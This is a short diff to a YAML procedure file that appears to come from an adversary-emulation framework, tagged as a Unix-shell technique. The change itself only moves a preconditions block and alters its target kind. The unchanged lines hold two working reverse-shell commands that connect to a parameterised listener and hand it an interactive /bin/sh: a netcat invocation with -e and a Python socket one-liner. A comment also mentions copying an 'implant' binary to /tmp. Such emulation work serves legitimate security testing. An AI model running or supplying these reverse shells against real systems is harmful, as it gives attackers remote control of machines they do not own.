@@ -5,6 +5,9 @@ techniques: ["Command and Scripting Interpreter: Unix Shell"]
 # args:
 #   SRC_BIN: "implant"
 #   DST_BIN: "/tmp/pause"
+preconditions:
+  accessLevel: user-exec
+  kind: System
 parameters:
   LISTENER:
     type: string
@@ -21,9 +24,6 @@ procedures:
     command: nc ${LISTENER} ${LISTENER_PORT} -e /bin/sh &
   - key: python
     command: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${LISTENER}",${LISTENER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-preconditions:
-  accessLevel: user-exec
-  kind: Pod
   # exists:
   #   - Listener
 # cmd: {}
